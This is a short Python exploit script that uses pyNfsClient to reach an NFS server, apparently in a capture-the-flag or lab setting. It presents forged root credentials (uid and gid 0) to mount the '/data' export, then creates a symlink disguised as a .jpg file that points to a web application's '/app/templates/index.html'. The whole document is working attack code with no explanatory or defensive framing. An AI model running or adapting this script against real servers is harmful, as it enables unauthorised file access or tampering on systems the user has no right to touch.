from pyNfsClient import (Portmap, Mount, NFSv3, MNT3_OK)
import time
host = "127.0.0.1"
mount_path = "/data"

portmap = Portmap(host, timeout=3600)
portmap.connect()
mnt_port = portmap.getport(Mount.program, Mount.program_version)
#mnt_port = 49507
print(mnt_port)

auth = {"flavor": 1,
        "machine_name": "host1",
        "uid": 0,
        "gid": 0,
        "aux_gid": list(),
        }

time.sleep(1)
mount = Mount(host=host, port=mnt_port, timeout=3600,auth=auth)
mount.connect()

mnt_res =mount.mnt(mount_path, auth)
if mnt_res["status"] == MNT3_OK:
    print(mnt_res)
    root_fh =mnt_res["mountinfo"]["fhandle"]
    time.sleep(1)
    nfs3 =NFSv3(host, 2049, 3600,auth=auth)
    nfs3.connect()
    nfs3.symlink(root_fh,  "fe55c5040ae73410196e0cc4ac4e4ce7.jpg", "/app/templates/index.html",auth=auth)
else:
    print(mnt_res)